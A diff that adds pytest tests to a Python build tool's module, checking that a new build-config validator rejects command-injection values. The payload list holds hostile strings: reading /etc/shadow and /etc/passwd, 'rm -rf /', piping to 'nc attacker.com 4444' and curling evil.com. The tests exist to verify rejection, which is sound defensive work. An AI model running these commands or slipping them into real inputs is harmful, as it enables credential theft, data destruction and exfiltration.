@@ -1,6 +1,9 @@
 from pathlib import Path
 
-from vispctl.build import BuildManager
+import pytest
+
+from vispctl.build import VALID_BUILD_CONFIGS, BuildManager, validate_build_config
+from vispctl.exceptions import BuildError
 
 
 class FakeRunner:
@@ -204,3 +207,63 @@ def test_build_node_project_skips_pre_build_when_not_configured(tmp_path):
     assert success is True
     # Only one command (the main build), no pre-build
     assert len(commands) == 1
+
+
+def test_validate_build_config_allows_valid_configs():
+    """All entries in VALID_BUILD_CONFIGS should pass validation."""
+    for cfg in VALID_BUILD_CONFIGS:
+        result = validate_build_config(cfg)
+        assert result == cfg
+
+
+def test_validate_build_config_allows_none():
+    """None should pass through (falls back to default_config)."""
+    assert validate_build_config(None) is None
+
+
+def test_validate_build_config_rejects_injection():
+    """Command injection payloads must be rejected."""
+    injection_payloads = [
+        "visp.dev; cat /etc/shadow",
+        "visp.dev && rm -rf /",
+        "visp.dev | nc attacker.com 4444",
+        "visp.dev`whoami`",
+        "$(cat /etc/passwd)",
+        "; echo pwned",
+        "production; curl http://evil.com",
+    ]
+    for payload in injection_payloads:
+        with pytest.raises(BuildError, match="Invalid build config"):
+            validate_build_config(payload)
+
+
+def test_build_node_project_rejects_malicious_config(tmp_path):
+    """build_node_project should raise BuildError for a malicious --config value."""
+    source = tmp_path / "src"
+    output = tmp_path / "out"
+    source.mkdir()
+    (source / "package.json").write_text("{}")
+
+    config = {
+        "source": str(source.resolve()),
+        "output": str(output.resolve()),
+        "build_cmd": "npx ng build --configuration={config}",
+        "verify_file": "main.js",
+    }
+
+    class FakeRunner:
+        def __init__(self):
+            self.last_cmd = None
+
+        def run(self, cmd, check=True):
+            self.last_cmd = cmd
+
+            class R:
+                returncode = 0
+
+            return R()
+
+    bm = BuildManager(FakeRunner(), build_configs={}, node_configs={})
+
+    with pytest.raises(BuildError, match="Invalid build config"):
+        bm.build_node_project("webclient", config, build_config="visp.dev; cat /etc/shadow")
